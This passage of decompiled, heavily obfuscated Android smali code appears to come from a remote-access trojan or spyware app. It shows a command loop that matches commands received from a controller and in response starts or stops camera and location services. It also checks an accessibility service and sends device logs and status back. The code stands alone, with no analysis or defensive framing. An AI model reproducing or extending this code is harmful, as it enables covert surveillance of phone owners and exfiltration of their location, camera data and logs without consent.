    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/CameraHandler;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1604
    aget-object v5, p1, v3

    invoke-virtual {v5, v0}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_66
    .catch Ljava/lang/Exception; {:try_start_66 .. :try_end_66} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_66 .. :try_end_66} :catch_15

    const-wide/16 v5, 0x3e8

    .line 1606
    :try_start_67
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_67
    .catch Ljava/lang/InterruptedException; {:try_start_67 .. :try_end_67} :catch_14
    .catch Ljava/lang/Exception; {:try_start_67 .. :try_end_67} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_67 .. :try_end_67} :catch_15

    goto/16 :goto_2a

    .line 1615
    :cond_a7
    :try_start_68
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    aget-object v5, v5, v15

    invoke-static {v11, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_a8

    .line 1616
    const-class v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/LocationService;

    aget-object v5, p1, v3

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/Tools;->NotServiceRunning(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_af

    .line 1617
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/LocationService;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    new-array v5, v7, [Ljava/lang/String;

    .line 1618
    aget-object v6, v10, v8

    aput-object v6, v5, v3

    aget-object v6, v10, v7

    aput-object v6, v5, v8

    .line 1619
    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/PacketClass;->FTX2:Ljava/lang/String;

    invoke-virtual {v0, v6, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 1621
    aget-object v5, p1, v3

    invoke-virtual {v5, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto/16 :goto_2a

    .line 1624
    :cond_a8
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    aget-object v5, v5, v13

    invoke-static {v11, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_a9

    .line 1625
    const-class v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/LocationService;

    aget-object v5, p1, v3

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/Tools;->NotServiceRunning(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v0
    :try_end_68
    .catch Ljava/lang/Exception; {:try_start_68 .. :try_end_68} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_68 .. :try_end_68} :catch_15

    if-nez v0, :cond_af

    .line 1628
    :try_start_69
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/LocationService;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1629
    aget-object v5, p1, v3

    invoke-virtual {v5, v0}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_69
    .catch Ljava/lang/Exception; {:try_start_69 .. :try_end_69} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_69 .. :try_end_69} :catch_15

    goto/16 :goto_2a

    .line 1634
    :cond_a9
    :try_start_6a
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v6, 0x8

    aget-object v5, v5, v6

    invoke-static {v11, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_aa

    .line 1635
    aget-object v0, p1, v3

    aget-object v5, v10, v8

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->temnqgeygzandswsjcljbrmacovqgncetbqlyinhufsuwfdglp40(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_2a

    .line 1636
    :cond_aa
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v6, 0x9

    aget-object v5, v5, v6

    invoke-static {v11, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_ab

    .line 1638
    aget-object v0, v10, v8

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1639
    :cond_ab
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v6, 0xb

    aget-object v5, v5, v6

    invoke-static {v11, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_ac

    .line 1640
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    aget-object v5, v10, v8

    aput-object v5, v0, v8

    .line 1642
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    aget-object v5, v10, v7

    aput-object v5, v0, v7

    .line 1643
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/4 v5, 0x3

    aget-object v6, v10, v5

    aput-object v6, v0, v5
    :try_end_6a
    .catch Ljava/lang/Exception; {:try_start_6a .. :try_end_6a} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6a .. :try_end_6a} :catch_15

    .line 1646
    :try_start_6b
    aget-object v0, p1, v3

    const-class v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->acc(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    sput-boolean v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->k:Z
    :try_end_6b
    .catch Ljava/lang/Exception; {:try_start_6b .. :try_end_6b} :catch_13
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6b .. :try_end_6b} :catch_15

    .line 1650
    :catch_13
    :try_start_6c
    sget-boolean v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->k:Z

    sput-boolean v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->klive:Z

    .line 1651
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    aget-object v5, v5, v8

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    aget-object v5, v5, v7

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-boolean v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->k:Z

    invoke-static {v5}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "|"

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->GetLogs()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto :goto_2a

    .line 1652
    :cond_ac
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v6, 0xc

    aget-object v5, v5, v6

    invoke-static {v11, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_ad

    .line 1654
    sput-boolean v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->klive:Z

    goto :goto_2a

    .line 1655
    :cond_ad
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v6, 0xd

    aget-object v5, v5, v6

    invoke-static {v11, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_ae

    .line 1657
    aget-object v0, v10, v8

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto :goto_2a

    .line 1658
    :cond_ae
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v6, 0xe

    aget-object v5, v5, v6

    invoke-static {v11, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_af

    .line 1659
    sget-boolean v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->echo:Z

    if-eqz v5, :cond_af

    .line 1660
    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->amyvdiarmdsvtcraibjbiuzjyccgbcfdbtremujklrnlwswbwi50(Ljava/lang/String;)V

    .line 1665
    :catch_14
    :cond_af
    :goto_2a
    sget-boolean v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->q:Z

    if-nez v0, :cond_b0

    .line 1666
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Li:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    goto :goto_2b

    .line 1668
    :cond_b0
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Li:Ljava/util/List;

    invoke-interface {v0, v3}, Ljava/util/List;->remove(I)Ljava/lang/Object;
    :try_end_6c
    .catch Ljava/lang/Exception; {:try_start_6c .. :try_end_6c} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6c .. :try_end_6c} :catch_15

    :goto_2b
    const-wide/16 v5, 0x1

    .line 1671
    :try_start_6d
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V

    goto/16 :goto_0

    :catch_15
    nop

    goto/16 :goto_0

    :cond_b1
    const-wide/16 v5, 0x3e8

    .line 1677
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_6d
    .catch Ljava/lang/InterruptedException; {:try_start_6d .. :try_end_6d} :catch_15
    .catch Ljava/lang/Exception; {:try_start_6d .. :try_end_6d} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6d .. :try_end_6d} :catch_15

    goto/16 :goto_0

    .line 1691
    :cond_b2
    :goto_2c
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyLOCK:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantLock;->unlock()V

    const/4 v0, 0x0

    return-object v0

    :pswitch_data_0
    .packed-switch 0x41
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method protected onCancelled()V
    .locals 1

    .line 1698
    invoke-super {p0}, Landroid/os/AsyncTask;->onCancelled()V

    .line 1699
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyLOCK:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantLock;->unlock()V

    return-void
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .line 184
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 1

    .line 1704
    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    if-eqz p1, :cond_0

    const-string v0, "out"

    .line 1705
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 1706
    sget-object p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyLOCK:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {p1}, Ljava/util/concurrent/locks/ReentrantLock;->unlock()V

    :cond_0
    return-void
.end method

.method protected onPreExecute()V
    .locals 0

    .line 199
    invoke-super {p0}, Landroid/os/AsyncTask;->onPreExecute()V

    return-void
.end method

.method public stop()V
    .locals 1

    const/4 v0, 0x1

    .line 194
    iput-boolean v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;->shouldStop:Z

    return-void
.end method
